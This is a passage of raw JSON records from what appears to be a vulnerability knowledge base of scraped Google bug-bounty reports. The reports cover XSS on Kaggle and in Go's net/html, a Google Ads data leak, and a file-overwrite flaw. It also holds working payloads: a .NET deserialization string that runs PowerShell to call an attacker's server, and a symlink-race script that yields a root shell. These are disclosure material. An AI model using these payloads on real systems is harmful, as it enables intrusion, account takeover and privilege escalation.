Mathjax .We are getting stored XSS . Add the code\r\n$$ \\href{javascript:alert(1)}{Click Me!} $$\r\nand save the description.\r\n4) You will see Click me! though I havent been able to bypass the CSP you can see the the domtree the href tag is active and when clicked should execute\r\njavascript:alert(document.domain)\r\n5) I was able to ESCALATE this xss to single-click account takeover since Kaggle does not add httpOnly cookies. So it's trivial to steal a user's cookie.\r\nCSS injection in Kaggle.com\r\nIf you normally try to inject CSS via the markdown you will notice that kaggle's sanitisers will block your attempts. I was able to inject CSS into Kaggle via the \\style element in Mathjax\r\n1) Follow the steps 1-2 in the above report\r\n2)Edit the the about dataset and then paste\r\n$$ \\style{background-color: #4b6bb7;padding: 100px; }{CSS} $$\r\nand save it.\r\n3) You will see the CSS on the page( Please refer to the attachment Kaggle_1 for quick verification)(Though the CSS is inside a div tag its always possible to BLEED the CSS to control the entire page.)\r\nAttack scenario\r\nKaggle is a subsidiary of google acquired 6 years ago\r\nhttps://en.wikipedia.org/wiki/Kaggle\r\n. It is a data science platform that allows users to participate in data science-related contests and run and share their code.\r\nI dont think i need to elaborate on the impact of the account takeover as thats already devastating.\r\nFor the css injection it should be trivial to create a fake signin page with the real url of Kaggle.com so thats pretty impactful. Please note that its also possible to inject CSS class name and CSS attribute id vie mathjax via the following code\r\n1)\r\n$$\\class{name}{any text}$$\r\n2)\r\n$$\\cssId{id}{any text}$$\r\nI didn't find an exploitation method on this but maybe it can be looped in somehow.\r\nNow for the fix and why i think you should consider the impact as 2 seperate bugs and not 1 major but and why i didnt make 2 seperate reports.\r\nGenerally google would have to implement closure library sanitization for each of the above attack vectors. But mathjax offers a Safe Mode which can be configured to fix them together\r\nhttps://docs.mathjax.org/en/v2.7-latest/options/other/Safe.html#configure-safe\r\nI would encourage google to consider this as 2 separate bugs since the root cause is different though they are similar. And i also have chained bugs to escalate the impact.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3319, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "10d61ed7-2e95-4585-aeb9-02b5b1022b3b": {"__data__": {"id_": "10d61ed7-2e95-4585-aeb9-02b5b1022b3b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.txt", "file_name": "20250408_175703_608027.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3fbc53f0-bb13-44e1-8062-aa37dba76f8f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.txt", "file_name": "20250408_175703_608027.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7c9311110297c1a044c5c11d03f803753d0ac14316a43fab2bdd17524bf6aefd", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nInvalid parsing of empty comments by Golang's net/html leads to XSS\r\nReported by:\r\nGrzegorz Niedziela\r\nGoogle VRP\r\ntriaged\r\n18:31 | Oct 12, 2022\r\naccepted\r\n20:53 | Oct 17, 2022\r\nfixed\r\n10:44 | Nov 18, 2022\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nInvalid parsing of empty comments by Golang's net/html leads to XSS\r\nProduct:\r\nGolang\r\nURL:\r\nhttps://github.com/golang/net\r\nVulnerability type:\r\nunknown\r\nDetails\r\nThe way Golang's net/html library parses HTML comments is inconsistent with what the browser does. \r\nBoth treat\r\n<!-->\r\nas an empty comment.\r\nBoth allow\r\n--!>\r\nto be the closing comment tag ie.\r\n<!-- this is the comment --!>\r\n.\r\nBut combining these two in an empty comment like this:\r\n<!--!>\r\nThe browser only treats this as a comment opening while\r\nnet/html\r\ntreats this as an empty comment.\r\nThus, when seeing this input:\r\n<!--!> <h1 value=\"--><a href=\"javascript:alert(document.domain)\">link\r\nThe browser sees:\r\n<!--\r\nas a comment opening\r\n!> <h1 value=\"\r\nas the comment's content\r\n-->\r\nas the comment closing\r\n<a href=\"javascript:alert(document.domain)\">link\r\nas an\r\na\r\ntag with a\r\nhref\r\nattribute of\r\njavascript:alert(document.domain)\r\n.\r\nnet/html\r\nsees:\r\n<!--!>\r\nas an empty comment\r\n<h1 value=\"--><a href=\"javascript:alert(document.domain)\">\r\nas an\r\nh1\r\ntag with a\r\nvalue\r\nattribute of\r\n--><a href=\r\nand\r\njavascript:alert(document.domain)\r\nas an attribute name without a value.\r\nAttack scenario\r\nThis discrepancy leads to an XSS in some contexts. \r\nFor example:\r\npackage main\r\n\r\nimport (\r\n    \"fmt\"\r\n    \"io/ioutil\"\r\n    \"log\"\r\n    \"strings\"\r\n\r\n    \"golang.org/x/net/html\"\r\n)\r\n\r\nfunc readHtmlFromFile(fileName string) (string, error) {\r\n\r\n    bs, err := ioutil.ReadFile(fileName)\r\n\r\n    if err != nil {\r\n        return \"\", err\r\n    }\r\n\r\n    return string(bs), nil\r\n}\r\n\r\nfunc is_allowed_html(text string) bool {\r\n\r\n    tkn := html.NewTokenizer(strings.NewReader(text))\r\n\r\n    for {\r\n\r\n        tt := tkn.Next()\r\n\r\n        switch {\r\n\r\n        case tt == html.ErrorToken:\r\n            return true\r\n        case tt == html.StartTagToken:\r\n            t := tkn.Token()\r\n            if t.Data == \"h1\" {\r\n                continue\r\n            } else {\r\n                return false\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nfunc main() {\r\n\r\n    fileName := \"index.html\"\r\n    text, err := readHtmlFromFile(fileName)\r\n\r\n    if err != nil {\r\n        log.Fatal(err)\r\n    }\r\n\r\n    valid := is_allowed_html(text)\r\n    fmt.Println(valid)\r\n        // html is safe, we can proceed\r\n}\r\nHere's a code that loads the aforementioned HTML file and checks whether there are any tags other than h1 (quite a strict allowlist if you ask me). If such HTML is deemed safe by this code and presented to the user, they are at risk of an XSS.\r\nNote that there's no threat when the element is serialised back by the library. The String method always outputs the comments as\r\nreturn \"<!--\" + EscapeString(t.Data) + \"-->\"\r\nwhere t.Data is the comment's content. This doesn't lead to an XSS.\r\nSimilarly, if we use\r\nhtml.Parse\r\nand then\r\nhtml.Render\r\non our input, that's what we get back:\r\n<!----><html><head></head><body><h1 value=\"--&gt;&lt;a href=\" javascript:alert(document.domain)\"=\"\">link</h1></body></html>\r\nwhich also won't lead to an XSS.\r\nHowever, as the built-in library\r\nnet/html\r\nis used in many different contexts where this behaviour can be exploited. \r\nFor reference, here's a similar issue with XML parsers' comment handling that led to iOS sanbdox escape:\r\nhttps://blog.siguza.net/psychicpaper/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3560, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e2db8286-eb89-43c0-82ea-ce429e67f439": {"__data__": {"id_": "e2db8286-eb89-43c0-82ea-ce429e67f439", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.txt", "file_name": "20250408_175703_655288.txt", "file_type": "text/plain", "file_size": 3696, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "61d5256c-c6b3-4fc1-bd32-8d00fd981a57", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.txt", "file_name": "20250408_175703_655288.txt", "file_type": "text/plain", "file_size": 3696, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3fab8d2ef2a78e20178f0f2a8f2a821a4190d82f421f6a1f852ca8f5bbd5db6b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nHi!  I found multiple vulnerabilities in Bulk Actions from Google Ads. After some trial and errors, I believe the vulnerability happens to trigger in the PREVIEW function of Bulk Actions.  I decided t\r\nReported by:\r\nKrishna Gupta\r\nGoogle VRP\r\ntriaged\r\n06:21 | Oct 4, 2022\r\naccepted\r\n00:32 | Oct 16, 2022\r\nfixed\r\n16:37 | Jan 12, 2023\r\nSummary:\r\nHi!  I found multiple vulnerabilities in Bulk Actions from Google Ads. After some trial and errors, I believe the vulnerability happens to trigger in the PREVIEW function of Bulk Actions.  I decided t\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGoogle Ads\r\nURL:\r\nhttps://ads.google.com/aw/bulk/executions\r\nVulnerability type:\r\nOther\r\nDetails\r\nPs. I don't work in Google so I might be wrong\r\ndashboard id Fictional, it is made up of 10 numeric characters which represents individual dashboard of a user. It is the first numeric string you will encounter when you decode the value of __ar. This might be public but I'm unsure which endpoint leaks it. Eg. 385089529\r\nscript id Fictional, it is made up of 8 numeric characters which represents the individual script in a dashboard. It is the second numeric string you will encounter in /aw_bulk/_/rpc/ScriptService/Preview when you decode the value of __ar. This value will be bruteforced by the attacker to gain the value of execution_id. Eg. 3931988\r\nexecution_id Non-fictional, this parameter name is reflected in /aw_bulk/\r\n/rpc/ExecutionProgressService/GetIncrementalProgress. It is made up of 20 numeric characters which indicates it's not a good idea to bruteforce it. Once this value is combined with dashboard id, it will return information of a script through /aw_bulk/\r\n/rpc/ExecutionProgressService/GetIncrementalProgress. Eg. 1725875959726807315\r\nAttack scenario\r\nScripts Endpoints\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nThe above endpoint will need a valid dashboard id and script id to return a valid execution_id. In the first request it will return an OAuth URL. By navigating to it, it will prompt user to grant access to the script which discloses the script name. After granting access, resend the request and it will return the value of execution_id which can be used in the next endpoint.\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nThis endpoint will need a valid combination of dashboard id and execution_id to return the output details of the script.\r\nUploads Endpoints\r\nThis endpoint is identical to /aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress above however it doesn't return useful information nor it can be chained with others.\r\n/aw_bulk/_/rpc/BulkExecutionStatusService/GetStatus\r\nI'm leaving it here if the security team wants to investigate further or patch it along.\r\nSteps to reproduce\r\nCreate a profile in Google Ads and navigate to Bulk Actions\r\nObserve exists 3 columns which are Rules, Scripts and Uploads\r\nClick Scripts and create a new script with the following code and name it\r\nfunction main() {\r\nLogger.log(\"Hello Google VRP!\")\r\n}\r\nPrepare to intercept a POST request to /aw_bulk/_/rpc/ScriptService/Preview\r\nClick Preview in the bottom right corner\r\nObtain the value of dashboard id and script id\r\nLogin into another account and perform the same thing.\r\nRetrieve the execution_id and use it in /aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress to get the script output information\r\nOptional: Use an account to intercept a POST request to /aw_bulk/_/rpc/ScriptService/Preview and substitude both values to 385089529 and 3931988. Both of them are valid values of dashboard id and script id from my test account.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3680, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "82493a88-9907-46b4-be03-46732cc51be3": {"__data__": {"id_": "82493a88-9907-46b4-be03-46732cc51be3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.txt", "file_name": "20250408_175705_765733.txt", "file_type": "text/plain", "file_size": 2619, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c3653e3e-2069-4f89-92dd-13429081a53e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.txt", "file_name": "20250408_175705_765733.txt", "file_type": "text/plain", "file_size": 2619, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8c9479e094914edcf9991335b4adfd6d3c71be988dfee641f80cce5377b29d5f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nUpdate source code at: https://www.partneradvantage.goog/GCPPRM/s/contentdocument/ContentDocument/All\r\nReported by:\r\nBen Chinoy\r\nGoogle VRP\r\ntriaged\r\n04:10 | Sep 28, 2022\r\naccepted\r\n06:00 | Sep 29, 2022\r\nfixed\r\n14:29 | Oct 22, 2022\r\nreward decided\r\n$5,000\r\nSummary:\r\nUpdate source code at:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/ContentDocument/All\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/ContentDocument/All\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHello,\r\nHope you are doing well. I wanted to report the following issue. If you login to:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/\r\nand visit the below URL:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/ContentDocument/All\r\nand then click \"Libraries\" on the left menu. There are two folders:\r\n1) PRM Content\r\n2) PRM Content Japanese\r\nBoth of these folders contain flexipage-meta files. Flexipage-meta XML files are what SalesForce uses to dynamically construct and display pages on the site. In both of these folders, all of the files can be completely updated or deleted. If you visit an example file:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/0694M00000JWyyBQAT\r\nyou can see on the right side, the file owner is a google employee. You can also see that it is possible to upload a new version or completely delete the file. In this example, under file details, we can see this file is tied to this URL path:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/artificial-intelligence\r\nRegular users shouldn't have the ability to update or delete any of these files. Right now anyone can update the code here. For example, I can put a script alert tag into the code or change it to whatever I want. Updating the code though, doesn't automatically lead to a change in the page. To actually update the page, someone needs to run force:source:push. This would eventually happen as part of the development progress.\r\nAttack scenario\r\nA regular user shouldn't be able to update the source code files of this site. A malicious user could update or delete all of these files.\r\nIf the files were updated/deleted and someone runs force:source:push the site would then update. I didn't want to leave any malicious files up there in case there is a regular update schedule or something like that, but it would be useful to take a look at the deployment process here and make sure none of the files have been updated/changed.\r\nLet me know if you have questions. Thanks!\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2603, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "382edd58-e745-4a53-a869-d5bfe6f85576": {"__data__": {"id_": "382edd58-e745-4a53-a869-d5bfe6f85576", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.txt", "file_name": "20250408_175705_797358.txt", "file_type": "text/plain", "file_size": 1734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "57c8e63b-7396-4653-9184-2dd505bd169b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.txt", "file_name": "20250408_175705_797358.txt", "file_type": "text/plain", "file_size": 1734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "97c7d3eb5df3e2eefb58b6f3bdfbeb02a6e889dc2e9ee515a70548d77a9d7037", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nDeserialization RCE in AppSheet\r\nReported by:\r\nChip\r\nGoogle VRP\r\ntriaged\r\n00:23 | Sep 20, 2022\r\naccepted\r\n02:06 | Sep 29, 2022\r\nfixed\r\n08:11 | Oct 31, 2022\r\nreward decided\r\n$10,000\r\nSummary:\r\nDeserialization RCE in AppSheet\r\nProduct:\r\nAppSheet\r\nURL:\r\nhttps://www.appsheet.com\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nIn the Automation section of AppSheet, it is possible to create a custom bot that can call the webhook located on the URL specified by the user (HTTP request). It is also possible to provide custom body data for this request and it is unsafely deserialized by the application.\r\nPOC\r\n: create a monthly scheduled bot with a step that will call webhook making HTTP POST request on any URL with this body (also in attached\r\npayload.txt\r\nfile), replacing\r\nyour_http_server_domain\r\nwith yours:\r\n{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','MethodParameters':{'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','$values':[**'cmd', '/c powershell -command \"Invoke-WebRequest -URI your_http_server_domain\"'**]},'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}\r\nYou will see in the server's logs the request was triggered by PowerShell code executed on the AppSheet server.\r\nAlso, you can see successful exploitation on the attached video\r\nAppSheet_Decerialization_RCE.mp4\r\n.\r\nAttack scenario\r\nAny remote attacker can achieve RCE in Google infrastructure\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1718, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c28ef5eb-973b-498c-91c7-19ff6ebdad05": {"__data__": {"id_": "c28ef5eb-973b-498c-91c7-19ff6ebdad05", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.txt", "file_name": "20250408_175705_828683.txt", "file_type": "text/plain", "file_size": 2288, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "990921b8-9814-466f-8b99-54ea64cf0433", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.txt", "file_name": "20250408_175705_828683.txt", "file_type": "text/plain", "file_size": 2288, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "970491b50c072c0b7549d8840bfd25de01518bdbd2d5f58ad59fc3c25c3dce91", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nInjecting Google Tag Manager inside Google Sites (sites.google.com) (should not be possible)\r\nReported by:\r\nAndre\r\nGoogle VRP\r\ntriaged\r\n18:06 | Sep 2, 2022\r\naccepted\r\n19:44 | Sep 2, 2022\r\nfixed\r\n07:55 | Sep 30, 2022\r\nreward decided\r\n$500\r\nSummary:\r\nInjecting Google Tag Manager inside Google Sites (sites.google.com) (should not be possible)\r\nProduct:\r\nGoogle Sites (sites.google.com)\r\nURL:\r\nhttps://sites.google.com\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nIn Google Sites the validation if the value is a valid Google Analytics account id is being made only in the frontend site, not in the backend. So, by changing the javascript function it is possible to send any string as a Google Analytics id, it is then saved and populated in the html of the pages hosted in the domain sites.google.com.\r\nAs Google Analytics (GA) and Google Tag Manager (GTM) are both served by the same server (\r\nhttps://www.googletagmanager.com/gtag/js?id=XXXXXXX\r\n), when someone sends a GTM id instead of GA id then the GTM will be successfully loaded in the site.\r\nAttached are the steps to reproduce the bug.\r\nHere is a demo site loading GTM instead of GA. And to prove it is working I'm running GA from inside this GTM:\r\nhttps://sites.google.com/view/gtm-in-g00gle-sites/home\r\nAttack scenario\r\nGoogle Tag Manager is a Javascript hosting tool that allows developers to update tags (scripts) without changing anything in the site server side. Inside GTM, Javascript tags can be created by filling out forms, for example, with a Google Analytics id, and also by inputting raw Javascript.\r\nGoogle Sites allow users to insert Javascript in the HTML by encapsulating it into nested iframes to avoid security problems (\"Embed code\" feature in Google Sites). But by tricking Google Sites into loading GTM outside iframes, in the main html of a site in a subdomain of \"google.com\", it opens itself to different kinds of attacks, mainly cross-site scripting and forgery.\r\nI did not explored this but it looks to me that with some creativity it would be possible to take over a Google Account and/or leak information of a user that visited an site hosted in sites.google.com with malicious code created using this bug.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2272, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a6a88632-d684-4123-9a08-daac48c9d3d2": {"__data__": {"id_": "a6a88632-d684-4123-9a08-daac48c9d3d2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.txt", "file_name": "20250408_175705_860089.txt", "file_type": "text/plain", "file_size": 3146, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3f327e6f-f253-4738-9c1a-4374d1f2b733", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.txt", "file_name": "20250408_175705_860089.txt", "file_type": "text/plain", "file_size": 3146, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3fc425d5e59fd9c48f5365f23a58a82700d0be3753ab712c55e7a8fcce879e1f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle Drive for Desktop macOS installer contains a local privilege escalation vulnerability.\r\nGoogle VRP\r\ntriaged\r\n23:24 | Aug 23, 2022\r\naccepted\r\n18:27 | Aug 24, 2022\r\nfixed\r\n22:19 | Oct 1, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nGoogle Drive for Desktop macOS installer contains a local privilege escalation vulnerability.\r\nProduct:\r\nGoogle Drive\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nGoogle Drive for Desktop (version 62.0.1.0) macOS installer contains a local privilege escalation vulnerability.\r\nIn the postinstall script of GoogleDrive.pkg, the following \"setuid\" function called for adding setuid permission to executables (load_dfsfuse, mount_dfsfuse, and mount_helper).\r\n#!/usr/bin/env sh\r\nset -x\r\n\r\nCONTENTS_ROOT=\"/Applications/Google Drive.app/Contents\"\r\nRESOURCES_ROOT=\"$CONTENTS_ROOT/Resources\"\r\nBINARIES_ROOT=\"$CONTENTS_ROOT/MacOS\"\r\nLOAD_DFSFUSE=\"$BINARIES_ROOT/load_dfsfuse\"\r\nMOUNT_DFSFUSE=\"$BINARIES_ROOT/mount_dfsfuse\"\r\nMOUNT_HELPER=\"$BINARIES_ROOT/mount_helper\"\r\n\r\n# Must be called after cleanup and before starting the new application.\r\nsetuid() {\r\n  # setuid the load_dfsfuse and mount_dfsfuse binaries.\r\n  chmod u+s \"$LOAD_DFSFUSE\"\r\n  chmod u+s \"$MOUNT_DFSFUSE\"\r\n  chmod u+s \"$MOUNT_HELPER\"\r\n}\r\nUnfortunately, during the installation, it does not check whether these three files are a symbolic link before adding setuid. So, if an attacker can place symbolic link to the executable owned by root (e.g., executables under /usr/local/bin/ ), setuid attribute is set to its executable. Then,  he can run the executable with root permission.\r\nCreating a symbolic link is usually prohibited because files under \"/Application/Google Drive.app/Contents/MacOS\" is owned by root. However, an attacker can create \"/Application/Google Drive.app/Contents/MacOS\" directory owned by a non-root user before the package installation. The installer does not delete this existing directory, and load_dfsfuse, mount_dfsfuse, and mount_helper are copied to the directory owned by the non-root user. So, an attacker can delete load_dfsfuse (, mount_dfsfuse, or mount_helper) and create a symbolic link.\r\nI have created PoC. The steps to reproduce are as follows.\r\nThe following python script is saved as win_race.py. and run this script. In this PoC,  setuid attribute is set to /opt/local/bin/fish executable. This executable is installed via Mac Ports (\r\nhttps://www.macports.org\r\n) package manager.\r\nimport os\r\n\r\nwhile True:\r\n    try:\r\n        os.system(\"mkdir -p '/Applications/Google Drive.app/Contents/MacOS'\")\r\n        if os.stat(\"/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse\").st_uid == 0:\r\n            os.system(\"rm -f '/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse'\")\r\n            os.system(\"ln -s /opt/local/bin/fish '/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse'\")\r\n    except:\r\n        pass\r\nRun the installer.\r\nSetuid is set to /opt/local/bin/fish.\r\nRun /opt/local/bin/fish and gain a root shell\r\nAttack scenario\r\nA local attacker can exploit this vulnerability and escalate its privilege.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3130, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "aa99bc5c-bddd-4507-adf0-e40fb06b3e9e": {"__data__": {"id_": "aa99bc5c-bddd-4507-adf0-e40fb06b3e9e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.txt", "file_name": "20250408_175705_907322.txt", "file_type": "text/plain", "file_size": 3009, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c3def46c-86ea-43b8-995c-e1ad40596e1f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.txt", "file_name": "20250408_175705_907322.txt", "file_type": "text/plain", "file_size": 3009, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c220f6c3af3e66dfa4c072d53e505062e3bff75ab18a4f374170ff2ac1a0675e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS by exploiting CSRF vulnerability\r\nGoogle VRP\r\ntriaged\r\n16:47 | Aug 22, 2022\r\nclosed\r\n18:29 | Aug 22, 2022\r\ntriaged\r\n20:26 | Aug 22, 2022\r\naccepted\r\n22:08 | Aug 23, 2022\r\nfixed\r\n09:09 | Sep 7, 2022\r\ntriaged\r\n14:21 | Sep 21, 2022\r\naccepted\r\n08:22 | Sep 22, 2022\r\nfixed\r\n08:23 | Sep 22, 2022\r\nSummary:\r\nXSS by exploiting CSRF vulnerability\r\nProduct:\r\nOpen source project - Google Cloud Platform:  \"Code samples used on cloud.google.com\"\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples/tree/main\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHey Google security team,\r\nRecently I reviewed the source code of your open-source project and identified a potential security risk in your code.\r\nProduct: >\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples\r\nVulnerable code\r\n\u2193\r\n@app.route('/example_task_handler', methods=['POST'])\r\ndef example_task_handler():\r\n    \"\"\"Log the request payload.\"\"\"\r\n    payload = request.get_data(as_text=True) or '(empty payload)'\r\n    print('Received task with payload: {}'.format(payload))\r\n    return 'Printed task payload: {}'.format(payload)\r\nCode link\r\n\u2193\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples/blob/a63091cdbde2536f2109bceaab7422f1261600ed/appengine/flexible/tasks/main.py#L28\r\nVulnerability\r\n\u2193\r\nCheck the code and you can see the unsanitized input from the HTTP request body flows into the return value of\r\nexample_task_handler\r\nwhere it is used to render an HTML page returned to the user. This result in a Cross-Site Scripting attack (XSS)\r\nChaining the bug\r\n\u2193\r\nAs you see, only HTTP POST method is allowed  ---> @app.route('/example_task_handler', methods=['POST'])\r\nand thus I'm chaining this with 